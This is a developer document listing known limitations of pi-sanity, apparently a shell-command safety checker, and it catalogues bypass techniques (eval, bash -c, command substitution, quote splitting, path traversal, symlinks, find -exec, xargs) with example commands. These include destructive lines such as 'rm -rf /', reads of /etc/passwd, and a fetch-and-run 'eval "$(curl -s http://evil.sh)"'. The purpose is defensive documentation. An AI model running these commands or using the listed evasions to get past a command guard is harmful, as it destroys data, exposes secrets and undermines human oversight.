# Pi-Sanity Known Limitations

This document describes known limitations of pi-sanity. These are attack vectors or edge cases that the current implementation does not fully handle.

**Design Philosophy:** Pi-sanity is a "best-effort" safety net, not a comprehensive security solution. When in doubt, we "fail open" (allow) to avoid blocking legitimate development workflows.

---

## Command Obfuscation

### Command Substitution: `$(echo rm) file.txt`

**Status:** Not detected  
**Risk:** Medium - Can bypass command-specific rules  
**Why Hard:** Command substitution requires either:
- Executing the inner command to get the result (dangerous)
- Complex static analysis to predict output (often impossible)

**Example:**
```bash
$(echo rm) /etc/passwd      # Currently treated as unknown command
$(which rm) /home/user/file # Same issue
```

**Potential Mitigation:** Flag ANY command with command substitution as "ask" when the outer command is not recognized.

---

### Backtick Substitution: `` `which rm` file.txt ``

**Status:** Not detected (same as above)  
**Risk:** Medium  
**Note:** Backticks are legacy syntax but parsed identically to `$()` by unbash.

---

### `eval`: `eval 'rm file.txt'`

**Status:** Not detected  
**Risk:** High - Executes arbitrary string as code  
**Why Hard:** Requires parsing the string argument as a bash script.

**Example:**
```bash
eval "rm -rf /"                    # Currently: allow
eval "$(curl -s http://evil.sh)"   # Currently: allow (extremely dangerous)
```

**Potential Mitigation:** Flag ALL `eval` usage as "ask" by default.

---

### Shell Invocation: `bash -c 'rm file.txt'`

**Status:** Not detected  
**Risk:** High - Entire command string is parsed and executed  
**Why Hard:** Requires recursively parsing the `-c` argument.

**Example:**
```bash
bash -c "rm -rf /"          # Currently: allow
sh -c "cat /etc/passwd"     # Currently: allow
```

**Potential Mitigation:** Parse `-c` argument as bash and check recursively.

---

### String Concatenation: `/bi'n'/rm file.txt`

**Status:** Not detected  
**Risk:** Low-Medium - Can bypass literal command matching  
**Why Hard:** unbash exposes quoted segments; would need to concatenate.

**Example:**
```bash
/bi'n'/rm file.txt           # Should resolve to /bin/rm
/usr/bi"n"/cat /etc/passwd  # Should resolve to /usr/bin/cat
```

**Potential Mitigation:** Resolve string concatenation during AST walking.

---

## Dynamic Path Resolution

### `find` with `-exec`: `find /home -exec rm {} \;`

**Status:** Partial - `find` command is checked, `-exec` command is not  
**Risk:** High - Can execute arbitrary commands on matched files  
**Why Hard:** Requires parsing `-exec` specially and checking the command.

**Example:**
```bash
find /home -name "*.tmp" -exec rm {} \;      # rm rules not applied
find / -type f -exec cat {} \;               # cat rules not applied
```

**Potential Mitigation:** Special-case `find` to parse `-exec` and `-ok` clauses.

---

### `xargs`: `cat files.txt | xargs rm`

**Status:** Not detected  
**Risk:** High - Takes stdin and runs command with those args  
**Why Hard:** Input comes from stdin (previous command or file).

**Example:**
```bash
cat /tmp/evil-files | xargs rm              # rm runs on arbitrary list
echo "/etc/passwd" | xargs cat              # Can read any file
```

**Potential Mitigation:** Flag `xargs` as "ask" when stdin is a pipe or file.

---

### Process Substitution: `cat <(cat /etc/passwd)`

**Status:** Partial - Inner command may not be checked  
**Risk:** Medium - Can read/write arbitrary files via inner command  
**Why Hard:** unbash parses process substitution as `CommandExpansion` nodes with nested scripts.

**Example:**
```bash
cat <(cat /etc/passwd)          # Inner cat /etc/passwd should be checked
cat <(rm -rf /) /dev/null       # rm inside process substitution
```

**Potential Mitigation:** Recursively check inner scripts in process substitution.

---

## Path Traversal

### Symlinks: `rm /home/user/link-to-secret`

**Status:** Not detected  
**Risk:** Medium - Can access files outside allowed paths via symlinks  
**Why Hard:** Requires filesystem access to resolve symlinks at check time.

**Example:**
```bash
# If /home/user/link-to-secret -> /etc/secret
rm /home/user/link-to-secret    # Currently: allow (checks literal path)
                                # Should: deny (resolves to /etc)
```

**Potential Mitigation:** Resolve symlinks using `fs.realpath()` before checking.

---

### Path Normalization: `rm /safe/../../etc/passwd`

**Status:** Not detected  
**Risk:** Medium - Path traversal attacks  
**Why Hard:** Currently checks literal path string.

**Example:**
```bash
rm /tmp/../../../etc/passwd     # Currently: allow (literal check)
                                # Should: deny (normalizes to /etc/passwd)
```

**Potential Mitigation:** Normalize paths using `path.normalize()` before checking.

---

### Environment Variables: `rm $SECRET_DIR/file.txt`

**Status:** Partial - Expanded in patterns but not in paths being checked  
**Risk:** Medium - Runtime values may differ from check-time values  
**Why Hard:** Environment variables can be set/changed at runtime.

**Example:**
```bash
SECRET_DIR=/etc rm $SECRET_DIR/passwd   # Currently: checks literal "$SECRET_DIR/passwd"
                                        # Should: check "/etc/passwd"
```

**Potential Mitigation:** Expand environment variables in command arguments before checking.

---

## Alias and Function Bypass

### Backslash Prefix: `\rm file.txt`

**Status:** Not detected  
**Risk:** Low - Bypasses shell aliases but not our checks  
**Why Hard:** Backslash is stripped by shell before command execution.

**Example:**
```bash
\rm file.txt                    # Currently: treated as "\rm" (unknown)
                                # Should: check as "rm"
```

**Potential Mitigation:** Strip leading backslash from command names.

---

### `command` Builtin: `command rm file.txt`

**Status:** Not detected  
**Risk:** Low - Bypasses shell functions  
**Why Hard:** `command` is a shell builtin that runs the external command.

**Example:**
```bash
command rm file.txt             # Currently: treated as "command" command
command cat /etc/passwd         # Should: check "rm" and "cat" subcommands
```

**Potential Mitigation:** Strip `command` and `builtin` keywords from command names.

---

## Complex Nesting

### Nested Eval: `eval $(echo 'rm file.txt')`

**Status:** Not detected  
**Risk:** High - Multiple layers of obfuscation  
**Why Hard:** Requires recursive parsing at multiple levels.

**Example:**
```bash
eval $(echo 'rm /etc/passwd')   # Currently: allow
```

**Potential Mitigation:** Combine mitigations for `eval` and command substitution.

---

### Subshell with Obfuscation: `(cd /tmp && $(echo rm) file.txt)`

**Status:** Partial - Subshell commands are checked, but obfuscation within them is not  
**Risk:** Medium - Same issues as above, but inside subshells  
**Why Hard:** Requires fixing obfuscation detection first.

---

## Indirect Execution

### `source` / `.`: `source /tmp/evil.sh`

**Status:** Partial - Treated as read operation  
**Risk:** High - Executes arbitrary code from file  
**Why Hard:** Would need to parse and check the sourced script.

**Example:**
```bash
source /tmp/evil.sh             # Currently: check read permission on file
. ./malicious-script.sh         # Should: check that file is safe to execute
```

**Potential Mitigation:** Flag `source` as "ask" for files outside trusted paths.

---

### Script Execution: `./malicious.sh`

**Status:** Not detected  
**Risk:** High - Executes arbitrary script  
**Why Hard:** Would need to parse the script file.

**Example:**
```bash
./scripts/setup.sh              # Currently: allow (unknown command)
../evil.sh                      # Should: flag as potentially dangerous
```

**Potential Mitigation:** Flag executable script execution as "ask".

---

### `exec`: `exec rm file.txt`

**Status:** Not detected  
**Risk:** Medium - Replaces shell process, but same effect as direct command  
**Why Hard:** `exec` is treated as the command name.

**Example:**
```bash
exec rm /etc/passwd             # Currently: treated as "exec" command
                                # Should: check "rm" subcommand
```

**Potential Mitigation:** Strip `exec` and check the following command.

---

## Design Trade-offs

### Why "Fail Open"?

When pi-sanity encounters something it doesn't understand, it returns "allow". This is intentional:

1. **Development Velocity:** Blocking legitimate workflows is worse than missing some edge cases
2. **User Trust:** False positives erode trust in the tool
3. **Best Effort:** Pi-sanity is a safety net, not a sandbox

### Why Not Just Flag Everything Suspicious as "Ask"?

We could be more aggressive and flag:
- Any command substitution
- Any `eval` usage
- Any `bash -c` invocation

But this would create friction for legitimate use cases:
```bash
# Legitimate but would be flagged
files=$(ls *.txt)              # Command substitution
eval "$(ssh-agent -s)"         # eval for agent setup
bash -c "echo $REMOTE_CMD"     # Remote execution workflows
```

The current approach tries to balance security with usability.

---

## Future Improvements

### Tiered Approach

1. **Static Analysis (Current):** Parse and check without execution
2. **Conservative Mode:** Flag obfuscation patterns as "ask"
3. **Sandbox Mode:** Execute in isolated environment to observe behavior

### Potential Enhancements

1. **Command Substitution Detection:** Flag or recursively check inner commands
2. **Eval Parsing:** Parse string arguments as bash scripts
3. **Path Normalization:** Resolve `..`, symlinks, and env vars
4. **Heuristic Mode:** Detect obfuscation patterns (mixed quotes, excessive escaping)
5. **Sourced Script Checking:** Parse and check `source` targets
6. **Audit Logging:** Log all "allow" decisions for suspicious patterns

---

## Contributing

Found a new limitation? Here's how to document it:

1. **Add to this file:** Describe the issue, risk level, and why it's hard
2. **File an issue:** If you have ideas for mitigation
3. **Submit a PR:** If you want to implement a fix

When adding tests for limitations:
- **DO NOT** add failing tests to the main test suite
- **DO** add tests that document current behavior (e.g., `assert.strictEqual(result.action, "allow")` if that's current behavior)
- **DO** update this document with the limitation
